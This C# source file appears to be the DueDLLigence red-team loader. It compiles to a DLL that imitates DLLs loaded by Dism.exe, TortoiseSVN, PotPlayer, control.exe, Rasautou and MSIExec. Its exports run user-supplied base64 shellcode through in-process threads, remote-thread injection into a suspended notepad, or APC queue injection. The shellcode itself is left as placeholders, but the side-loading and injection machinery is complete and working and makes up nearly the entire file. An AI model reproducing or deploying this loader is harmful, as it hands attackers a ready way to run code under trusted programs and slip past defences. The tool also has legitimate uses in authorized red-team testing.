using System;
using RGiesecke.DllExport;
using System.Runtime.InteropServices;
using System.Diagnostics;

/* Copyright (C) 2019 FireEye, Inc. All Rights Reserved.
 * 
 * Last Updated: 2020-01-21
 * Author: Evan Pena
 * Contributors: Casey Erikson, Ruben Boonen, Brett Hawkins
 * Original research/Inspired by: Casey Smith. 
 * Optional: CallingConvention.StdCall. I like using Cdecl because it's not used as often.
 * See README for usage
 * User provides own shellcode
 */

namespace DueDLLigence
{
    public class DueDLLigence
    {
        //Change to preferred execution/injection method
        public const ExecutionMethod method = ExecutionMethod.CreateThread;

        // Set global path if injecting remotely
        // x86 OS -> DefaultProcPath
        // x64 OS & x64 process -> DefaultProcPath
        // x64 OS & x86 process -> SysWOW64ProcPath
        static String DefaultProcPath = @"C:\Windows\System32\notepad.exe";
        static String SysWOW64ProcPath = @"C:\Windows\SysWOW64\notepad.exe";

        // Shellcode
        static String Shellcode32 = "your base64 encoded 32-bit shellcode";
        static String Shellcode64 = "your base64 encoded 64-bit shellcode";
        

        //~~~~~~~~~~~~~~~~
        // Dism Image Servicing Utility (Dism.exe)
        // |--> DLL == "DismCore.dll"; Arch == x64; OS == Win7 & 10;
        //~~~~~~~~~~~~~~~~
        [DllExport("DllGetClassObject", CallingConvention = CallingConvention.StdCall)]
        public static bool DllGetClassObject()
        {
            RunShellcode();
            return false;
        }


        //~~~~~~~~~~~~~~~~
        // Tortoise SVN SubWCRev.exe 
        // |--> DLL == "crshhndl.dll"; Arch == x64; OS == Win7 & 10;
        //~~~~~~~~~~~~~~~~
        [DllExport("InitCrashHandler", CallingConvention = CallingConvention.StdCall)]
        public static bool InitCrashHandler()
        {
            RunShellcode();
            return false;
        }

        [DllExport("SendReport", CallingConvention = CallingConvention.StdCall)]
        public static bool SendReport() { return false; }

        [DllExport("IsReadyToExit", CallingConvention = CallingConvention.StdCall)]
        public static bool IsReadyToExit() { return false; }

        [DllExport("SetCustomInfo", CallingConvention = CallingConvention.StdCall)]
        public static bool SetCustomInfo() { return false; }

        [DllExport("AddUserInfoToReport", CallingConvention = CallingConvention.StdCall)]
        public static bool AddUserInfoToReport() { return false; }

        [DllExport("RemoveUserInfoFromReport", CallingConvention = CallingConvention.StdCall)]
        public static bool RemoveUserInfoFromReport() { return false; }

        [DllExport("AddFileToReport", CallingConvention = CallingConvention.StdCall)]
        public static bool AddFileToReport() { return false; }

        [DllExport("RemoveFileFromReport", CallingConvention = CallingConvention.StdCall)]
        public static bool RemoveFileFromReport() { return false; }

        [DllExport("GetVersionFromApp", CallingConvention = CallingConvention.StdCall)]
        public static bool GetVersionFromApp() { return false; }

        [DllExport("GetVersionFromFile", CallingConvention = CallingConvention.StdCall)]
        public static bool GetVersionFromFile() { return false; }


        //~~~~~~~~~~~~~~~~
        // PotPlayerMini
        // |--> DLL == "PotPlayer.dll"; Arch == x86;
        //~~~~~~~~~~~~~~~~
        [DllExport("PreprocessCmdLineExW", CallingConvention = CallingConvention.StdCall)]
        public static bool PreprocessCmdLineExW()
        {
            RunShellcode();
            return false;
        }

        [DllExport("UninitPotPlayer", CallingConvention = CallingConvention.StdCall)]
        public static bool UninitPotPlayer() { return false; }

        [DllExport("CreatePotPlayerExW", CallingConvention = CallingConvention.StdCall)]
        public static bool CreatePotPlayerExW() { return false; }

        [DllExport("DestroyPotPlayer", CallingConvention = CallingConvention.StdCall)]
        public static bool DestroyPotPlayer() { return false; }

        [DllExport("SetPotPlayRegKeyW", CallingConvention = CallingConvention.StdCall)]
        public static bool SetPotPlayRegKeyW() { return false; }

        [DllExport("RunPotPlayer", CallingConvention = CallingConvention.StdCall)]
        public static bool RunPotPlayer() { return false; }


        //Entry point for control.exe. Rename compiled DLL to .cpl file extension
        [DllExport("CPlApplet", CallingConvention = CallingConvention.Cdecl)]
        public static bool CPlApplet()
        {
            RunShellcode();
            return false;
        }

        //Entry point for Rasautou.exe
        [DllExport("powershell", CallingConvention = CallingConvention.Cdecl)]
        public static bool Powershell()
        {
            RunShellcode();
            return false;
        }

        //Entry point for MSIExec
        [DllExport("DllUnregisterServer", CallingConvention = CallingConvention.Cdecl)]
        public static bool DllUnRegisterServer()
        {
            RunShellcode();
            return false;
        }


        // Bootstrap
        //=============================================

        private static void RunShellcode()
        {
            //Execute or inject shellcode
            switch (method)
            {
                case ExecutionMethod.CreateThread:
                    ExecCreateThread();
                    break;
                case ExecutionMethod.CreateRemoteThread:
                    ExecCreateRemoteThread();
                    break;
                case ExecutionMethod.QueueUserAPC:
                    ExecQueueUserAPC();
                    break;
            }
        }

        // Methods
        //=============================================

        private static void ExecCreateThread()
        {
            //Initializations
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            byte[] shellcode = new byte[] { };

            // Prevent multi-execution of payloads
            if (!SafetyHandler())
            {
                return;
            }

            // Set shellcode
            if (IntPtr.Size == 8)
            {
                shellcode = Convert.FromBase64String(Shellcode64);
            }
            else
            {
                shellcode = Convert.FromBase64String(Shellcode32);
            }

            //Allocate executable memory in current process
            IntPtr address = VirtualAlloc(IntPtr.Zero, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_READWRITE);
            if (address == IntPtr.Zero)
            {
                return;
            }

            //Copy shellcode into allocated memory
            Marshal.Copy(shellcode, 0, address, shellcode.Length);

            //Modify memory protections to allow execution
            if (!VirtualProtect(address, (uint)shellcode.Length, PAGE_EXECUTE_READ, out uint oldProtect))
            {
                //Clean up memory and exit
                VirtualFree(address, 0, FreeType.Release);
                return;
            }

            //Create thread in current process to execute shellcode
            hThread = CreateThread((IntPtr)0, 0, address, IntPtr.Zero, 0, ref threadId);

            if (hThread == IntPtr.Zero)
            {
                //Clean up memory allocation and exit
                VirtualFree(address, 0, FreeType.Release);
                return;
            }

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }

        private static void ExecCreateRemoteThread()
        {
            //Initialization
            IntPtr bytesWritten = IntPtr.Zero;
            String process = String.Empty;
            byte[] shellcode = new byte[] { };

            // Prevent multi-execution of payloads
            if (!SafetyHandler())
            {
                return;
            }

            // Set Shellcode
            if (OsIs32())
            {
                process = DefaultProcPath;
                shellcode = Convert.FromBase64String(Shellcode32);
            }
            else
            {
                if (IntPtr.Size == 8)
                {
                    process = DefaultProcPath;
                    shellcode = Convert.FromBase64String(Shellcode64);
                }
                else
                {
                    process = SysWOW64ProcPath;
                    shellcode = Convert.FromBase64String(Shellcode32);
                }
            }

            //Start process to inject into
            PROCESS_INFORMATION processInfo = StartProcess(process);
            if (processInfo.hProcess == IntPtr.Zero)
            {
                return;
            }

            //Allocate executable memory
            IntPtr address = VirtualAllocEx(processInfo.hProcess, IntPtr.Zero, shellcode.Length, MEM_COMMIT, PAGE_READWRITE);
            if (address == IntPtr.Zero)
            {
                TerminateProcess(processInfo.hProcess, 0);
                return;
            }

            //Write shellcode into allocated memory in target process
            if (!WriteProcessMemory(processInfo.hProcess, address, shellcode, shellcode.Length, out bytesWritten))
            {
                //Clean up memory allocation, stop process, and exit
                Clean(processInfo.hProcess, address, shellcode.Length);
                return;
            }

            //Modify memory protections to allow execution
            if (!VirtualProtectEx(processInfo.hProcess, address, shellcode.Length, PAGE_EXECUTE_READ, out uint oldProtect))
            {
                //Clean up memory allocation, stop process, and exit
                Clean(processInfo.hProcess, address, shellcode.Length);
                return;
            }

            //Create thread in remote process to execute shellcode
            if (CreateRemoteThread(processInfo.hProcess, IntPtr.Zero, 0, address, IntPtr.Zero, 0, IntPtr.Zero) == IntPtr.Zero)
            {
                //Clean up memory allocation, stop process, and exit
                Clean(processInfo.hProcess, address, shellcode.Length);
                return;
            }
        }

        private static void ExecQueueUserAPC()
        {
            //Initialization
            IntPtr bytesWritten = IntPtr.Zero;
            String process = String.Empty;
            byte[] shellcode = new byte[] { };

            // Prevent multi-execution of payloads
            if (!SafetyHandler())
            {
                return;
            }

            // Set Shellcode
            if (OsIs32())
            {
                process = DefaultProcPath;
                shellcode = Convert.FromBase64String(Shellcode32);
            }
            else
            {
                if (IntPtr.Size == 8)
                {
                    process = DefaultProcPath;
                    shellcode = Convert.FromBase64String(Shellcode64);
                }
                else
                {
                    process = SysWOW64ProcPath;
                    shellcode = Convert.FromBase64String(Shellcode32);
                }
            }

            //Start process to inject into
            PROCESS_INFORMATION processInfo = StartProcess(process);
            if (processInfo.hProcess == IntPtr.Zero)
            {
                return;
            }

            Process targetProcess = Process.GetProcessById((int)processInfo.dwProcessId);

            //Allocate executable memory 
            IntPtr address = VirtualAllocEx(processInfo.hProcess, IntPtr.Zero, shellcode.Length, MEM_COMMIT, PAGE_READWRITE);
            if (address == IntPtr.Zero)
            {
                TerminateProcess(processInfo.hProcess, 0);
                return;
            }

            //Write shellcode into allocated memory in target process
            if (!WriteProcessMemory(processInfo.hProcess, address, shellcode, shellcode.Length, out bytesWritten))
            {
                //Clean up memory allocation, stop process, and exit
                Clean(processInfo.hProcess, address, shellcode.Length);
                return;
            }

            //Modify memory protections to allow execution
            if (!VirtualProtectEx(processInfo.hProcess, address, shellcode.Length, PAGE_EXECUTE_READ, out uint oldProtect))
            {
                //Clean up memory allocation, stop process, and exit
                Clean(processInfo.hProcess, address, shellcode.Length);
                return;
            }

            //Open a thread in target process
            ProcessThreadCollection currentThreads = Process.GetProcessById((int)processInfo.dwProcessId).Threads;

            IntPtr thread = OpenThread(ThreadAccess.SET_CONTEXT, false, currentThreads[0].Id);
            if (thread == IntPtr.Zero)
            {
                //Clean up memory allocation, stop process, and exit
                Clean(processInfo.hProcess, address, shellcode.Length);
                return;
            }

            //Queue thread for asynchronous procedure call
            IntPtr ptr = QueueUserAPC(address, thread, IntPtr.Zero);
            if (ptr == IntPtr.Zero)
            {
                //Clean up memory allocation, stop process, and exit
                Clean(processInfo.hProcess, address, shellcode.Length);
                return;
            }

            //Resume thread to execute shellcode
            if (ResumeThread(processInfo.hThread) == 0)
            {
                //Clean up memory allocation, stop process, and exit
                Clean(processInfo.hProcess, address, shellcode.Length);
                return;
            }
        }

        // Helpers
        //=============================================

        private static Boolean SafetyHandler()
        {
            lock (PayloadLock)
            {
                if (!PayloadHasRun)
                {
                    PayloadHasRun = true;
                    return true;
                }
                else
                {
                    return false;
                }
            }
        }

        private static void Clean(IntPtr hProcess, IntPtr address, int length)
        {
            VirtualFreeEx(hProcess, address, length, FreeType.Release);
            TerminateProcess(hProcess, 0);
        }

        private static PROCESS_INFORMATION StartProcess(string process)
        {
            STARTUPINFO startupInfo = new STARTUPINFO();
            PROCESS_INFORMATION processInfo = new PROCESS_INFORMATION();
            bool success = CreateProcess(
                process,
                null,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                ProcessCreationFlags.CREATE_SUSPENDED | ProcessCreationFlags.CREATE_NO_WINDOW,
                IntPtr.Zero,
                null,
                ref startupInfo,
                out processInfo);

            return processInfo;
        }

        public static Boolean OsIs32()
        {
            String x86Env = Environment.GetEnvironmentVariable("ProgramFiles(x86)");
            if (String.IsNullOrEmpty(x86Env))
            {
                return true;
            }
            else
            {
                return false;
            }
        }


        // Declarations
        //=============================================

        private static readonly object PayloadLock = new object();
        private static Boolean PayloadHasRun = false;
        private static readonly UInt32 MEM_COMMIT = 0x1000;
        private static readonly UInt32 PAGE_EXECUTE_READ = 0x20;
        private static readonly UInt32 PAGE_READWRITE = 0x04;

        public enum ExecutionMethod
        {
            CreateThread,       // in-process execution
            CreateRemoteThread, // oop execution
            QueueUserAPC        // oop execution
        }

        public enum FreeType
        {
            Decommit = 0x4000,
            Release = 0x8000,
        }

        public enum ProcessCreationFlags : uint
        {
            CREATE_NO_WINDOW = 0x08000000,
            CREATE_SUSPENDED = 0x00000004
        }

        public enum ThreadAccess : int
        {
            SET_CONTEXT = (0x0010)
        }

        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [DllImport("kernel32.dll")]
        public static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            ProcessCreationFlags dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll")]
        public static extern bool TerminateProcess(
            IntPtr hProcess,
            uint uExitCode);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThread(
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId);

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(
            int dwDesiredAccess,
            bool bInheritHandle,
            int dwProcessId);

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenThread(
            ThreadAccess dwDesiredAccess,
            bool bInheritHandle,
            int dwThreadId);

        [DllImport("kernel32.dll")]
        public static extern IntPtr QueueUserAPC(
            IntPtr pfnAPC,
            IntPtr hThread,
            IntPtr dwData);

        [DllImport("kernel32.dll")]
        public static extern uint ResumeThread(
            IntPtr hThread);

        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAlloc(
            IntPtr lpStartAddr,
            UInt32 size,
            UInt32 flAllocationType,
            UInt32 flProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            Int32 dwSize,
            UInt32 flAllocationType,
            UInt32 flProtect);

        [DllImport("kernel32.dll")]
        private static extern bool VirtualFree(
            IntPtr lpAddress,
            UInt32 dwSize,
            FreeType dwFreeType);

        [DllImport("kernel32.dll")]
        public static extern bool VirtualFreeEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            FreeType dwFreeType);

        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtect(
            IntPtr lpAddress,
            uint dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        public static extern UInt32 WaitForSingleObject(
            IntPtr hHandle,
            uint dwMilliseconds);

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int nSize,
            out IntPtr lpNumberOfBytesWritten);

    }

}
